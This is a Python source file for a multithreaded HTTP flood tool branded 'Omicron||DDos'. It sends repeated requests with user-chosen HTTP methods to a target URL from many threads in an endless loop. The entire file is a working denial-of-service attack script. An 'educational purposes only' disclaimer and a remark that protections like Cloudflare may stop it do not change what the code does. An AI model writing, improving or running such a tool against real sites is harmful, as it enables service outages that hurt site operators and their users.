import argparse
import threading
import requests
from colorama import Fore, Style
from os import system
import os
import art

menu_shown = False
my_art = art.text2art("omicron", font='shadow')
text = f"{Fore.MAGENTA}Omicron||DDos{Style.RESET_ALL}"

def show_menu():
    global menu_shown
    if not menu_shown:
        system("cls||clear")
        print(Fore.LIGHTBLUE_EX + my_art)
        menu_shown = True

def attack(target, methods):
    methods = methods.split(',')
    while True:
        for method in methods:
            try:
                response = requests.request(method.upper(), target)
                if response.status_code == 200:
                    print(f"{Fore.GREEN}[+] {text}{Fore.GREEN} Successfully sent to {target}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[-] {text}{Fore.RED} Sending Error! {Style.RESET_ALL}")
            except requests.exceptions.RequestException as e:
                print(f"{Fore.RED}[-] {text}{Fore.RED} Sending Error! {method.upper()} request to {target} - {e}{Style.RESET_ALL}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DDoS Attack Script")
    parser.add_argument("-target", required=True, help="Target URL (e.g., https://example.com/)")
    parser.add_argument("-methods", required=True, help="Comma-separated HTTP methods to use in the attack (e.g., GET,POST)")
    parser.add_argument("-threads", required=True, type=int, help="Number of threads to use in the attack")
    args = parser.parse_args()
    show_menu()
    print(f"{Fore.RED}[!] Warning: This is a dangerous program. It is made for educational purposes only. I take no responsibility!{Style.RESET_ALL}")
    print("\n")
    print(f"{Fore.YELLOW}[!] Note: It may not work if the target site has protections like Cloudflare, etc.{Style.RESET_ALL}")

    threads = []
    for i in range(args.threads):
        t = threading.Thread(target=attack, args=(args.target, args.methods))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
